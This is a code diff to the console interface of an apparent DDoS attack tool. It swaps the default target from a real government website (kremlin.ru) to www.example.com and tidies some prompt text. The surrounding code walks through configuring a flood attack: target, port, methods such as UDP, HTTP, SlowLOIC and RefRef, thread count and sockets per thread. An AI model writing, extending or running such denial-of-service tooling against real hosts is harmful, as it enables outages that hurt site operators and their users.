@@ -33,9 +33,9 @@ namespace GAS.TUI
                 }
             #endregion
             #region Select target
-            Console.WriteLine("Select target[kremlin.ru]");
+            Console.WriteLine("Select target [www.example.com]");
             temp = Console.ReadLine();
-            temp = (temp == "" ? "kremlin.ru" : temp);
+            temp = (temp == "" ? "www.example.com" : temp);
             foreach(string s in Blacklist)
                 if (temp.ToLower().Contains(s))
                 {
@@ -57,7 +57,7 @@ namespace GAS.TUI
             Core.Port = int.Parse((temp = Console.ReadLine()) == "" ? "80" : temp);
             Console.WriteLine("Select attack type [ReCoil] (UDP|TCP|HTTP|ReCoil|SlowLOIC|RefRef|AhrDosme|Post|TMOF)");
             Core.Method = (GAS.Core.AttackMethod) Enum.Parse(typeof(GAS.Core.AttackMethod), (temp=Console.ReadLine())==""?"ReCoil":temp);
-            Console.WriteLine("Enter thread count[50]");
+            Console.WriteLine("Enter thread count [50]");
             Core.Threads = int.Parse((temp = Console.ReadLine()) == "" ? "50" : temp);
             Console.WriteLine("Enter sockets per thread [50]");
             Core.SPT = int.Parse((temp = Console.ReadLine()) == "" ? "50" : temp);
@@ -69,7 +69,7 @@ namespace GAS.TUI
             Core.USEGet = bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp);
             Console.WriteLine("USE GZIP [true]");
             Core.UseGZIP = bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp);
-            Console.WriteLine("Wait    For Response [false] ");
+            Console.WriteLine("Wait For Response [false] ");
             Core.WaitForResponse = bool.Parse((temp = Console.ReadLine()) == "" ? "false" : temp);
             Console.WriteLine("Append RANDOMC hars [true]");
             Core.AppendRANDOMChars = bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp);
